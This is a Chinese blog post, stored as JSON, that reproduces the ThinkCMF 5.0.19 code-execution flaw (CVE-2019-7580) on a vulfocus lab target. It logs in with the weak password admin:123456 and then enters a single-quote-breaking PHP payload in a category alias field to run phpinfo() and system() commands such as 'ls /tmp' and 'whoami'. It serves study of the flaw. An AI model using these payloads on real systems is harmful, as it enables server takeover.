{"title":"「vulfocus漏洞复现」thinkcmf代码执行漏洞（CVE-2019-7580）","uid":"29b4b7f1cf64f4a3b1771dd32dd24d66","slug":"CVE-2019-7580","date":"2022-03-16T06:41:07.000Z","updated":"2022-03-16T07:12:40.020Z","comments":true,"path":"api/articles/CVE-2019-7580.json","keywords":null,"cover":[],"content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p><code>   ThinkCMF是一款支持Swoole的开源内容管理框架(CMF),基于ThinkPHP开发. thinkcmf5.0.19 这个版本后台提供路由自定义，其中路由的别名对单引号缺少过滤，导致引发漏洞。</code><a href=\"http://vulfocus.io/\">^1</a></p>\n<hr>\n<h1 id=\"0x01进入后台\"><a href=\"#0x01进入后台\" class=\"headerlink\" title=\"0x01进入后台\"></a>0x01进入后台</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>进入后台路径为:<a href=\"http://ip:port/admin\">http://ip:port/admin</a></p></blockquote>\n<h1 id=\"0x02我们这里使用弱口令登录\"><a href=\"#0x02我们这里使用弱口令登录\" class=\"headerlink\" title=\"0x02我们这里使用弱口令登录\"></a>0x02我们这里使用弱口令登录</h1><p>账户密码：admin:123456 </p>\n<p><img src=\"/post/CVE-2019-7580/16473983766198.jpg\"></p>\n<h1 id=\"0x03进入添加分类页面\"><a href=\"#0x03进入添加分类页面\" class=\"headerlink\" title=\"0x03进入添加分类页面\"></a>0x03进入添加分类页面</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>依次进入<br>1、门户管理<br>2、分类管理<br>3、添加分类</p></blockquote>\n<p>分类名称随便填</p>\n<p><strong>分类别名输入poc:</strong></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">'=>array(\"\"),phpinfo(),'</span><span class=\"token number\">2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>描述随便填</p>\n<p><img src=\"/post/CVE-2019-7580/16473937848955.jpg\"></p>\n<p>添加后,点击勾,点击显示,出现如下页面</p>\n<p><img src=\"/post/CVE-2019-7580/16473943079092.jpg\"><br>复现成功</p>\n<h1 id=\"获取flag命令\"><a href=\"#获取flag命令\" class=\"headerlink\" title=\"获取flag命令:\"></a>获取flag命令:</h1><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">'=>array(\"\"),system(‘ls /tmp’),'</span><span class=\"token number\">2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"/post/CVE-2019-7580/16473978529121.jpg\"></p>\n<h3 id=\"获取system-执行命令\"><a href=\"#获取system-执行命令\" class=\"headerlink\" title=\"获取system()执行命令:\"></a>获取system()执行命令:</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">'=>array(\"\"),system(‘id’),'</span><span class=\"token number\">2</span>\n<span class=\"token number\">1</span><span class=\"token string single-quoted-string\">'=>array(\"\"),system(‘whoami’),'</span><span class=\"token number\">2</span>\n<span class=\"token number\">1</span><span class=\"token string single-quoted-string\">'=>array(\"\"),system(‘pwd’),'</span><span class=\"token number\">2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>写作耗时30min-@(｡･o･)@</strong></p>\n","feature":true,"text":"前言 ThinkCMF是一款支持Swoole的开源内容管理框架(CMF),基于ThinkPHP开发. thinkcmf5.0.19 这个版本后台提供路由自定义，其中路由的别名对单引号缺少过滤，导致引发漏洞。^1 0x01进入后台 进入后台路径为:http://ip:port/ad...","link":"","photos":[],"count_time":{"symbolsCount":488,"symbolsTime":"1 mins."},"categories":[{"name":"漏洞复现","slug":"漏洞复现","count":1,"path":"api/categories/漏洞复现.json"}],"tags":[{"name":"学习笔记","slug":"学习笔记","count":5,"path":"api/tags/学习笔记.json"},{"name":"漏洞复现","slug":"漏洞复现","count":1,"path":"api/tags/漏洞复现.json"},{"name":"CVE","slug":"CVE","count":1,"path":"api/tags/CVE.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x01%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0\"><span class=\"toc-text\">0x01进入后台</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x02%E6%88%91%E4%BB%AC%E8%BF%99%E9%87%8C%E4%BD%BF%E7%94%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%99%BB%E5%BD%95\"><span class=\"toc-text\">0x02我们这里使用弱口令登录</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x03%E8%BF%9B%E5%85%A5%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E9%A1%B5%E9%9D%A2\"><span class=\"toc-text\">0x03进入添加分类页面</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96flag%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">获取flag命令:</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96system-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">获取system()执行命令:</span></a></li></ol></li></ol></li></ol>","author":{"name":"wjl110","slug":"blog-author","avatar":"https://avatars.githubusercontent.com/u/53851034?s=400&u=d3e4276dbc73f46c11ffa447d9d9d0803c5274ea&v=4","link":"/","description":"一位有品位的信息安全开发者~<br /> @ <b>Github:<br />https://github.com/wjl110</b><br /><b>@csdn:<br />https://blog.csdn.net/qq_37092496</b><br /><b>@localhost:<br />wjl110.xyz</b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"反弹shell命令学习笔记","uid":"e54765d52f8094054e22b090d91f01da","slug":"反弹shell","date":"2022-03-15T09:20:06.000Z","updated":"2022-03-15T13:15:37.893Z","comments":true,"path":"api/articles/反弹shell.json","keywords":null,"cover":[],"text":"文章目录 前言 为何给靶机发送这条执行命令就会自动连接到本地计算机,并且出发实时通讯机制(ps:有点类似oicq,前生就是用的这种模式开发的即时通讯) 作为渗透测试人员必备技能,反弹shell到底是什么原理,以及如何使用,本文是自己学习shell命令时的个人感悟和笔记,文章内容大...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[{"name":"技术","slug":"技术","count":3,"path":"api/categories/技术.json"}],"tags":[{"name":"学习笔记","slug":"学习笔记","count":5,"path":"api/tags/学习笔记.json"},{"name":"Mac","slug":"Mac","count":2,"path":"api/tags/Mac.json"},{"name":"shell","slug":"shell","count":1,"path":"api/tags/shell.json"},{"name":"kali-Linux","slug":"kali-Linux","count":1,"path":"api/tags/kali-Linux.json"}],"author":{"name":"wjl110","slug":"blog-author","avatar":"https://avatars.githubusercontent.com/u/53851034?s=400&u=d3e4276dbc73f46c11ffa447d9d9d0803c5274ea&v=4","link":"/","description":"一位有品位的信息安全开发者~<br /> @ <b>Github:<br />https://github.com/wjl110</b><br /><b>@csdn:<br />https://blog.csdn.net/qq_37092496</b><br /><b>@localhost:<br />wjl110.xyz</b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}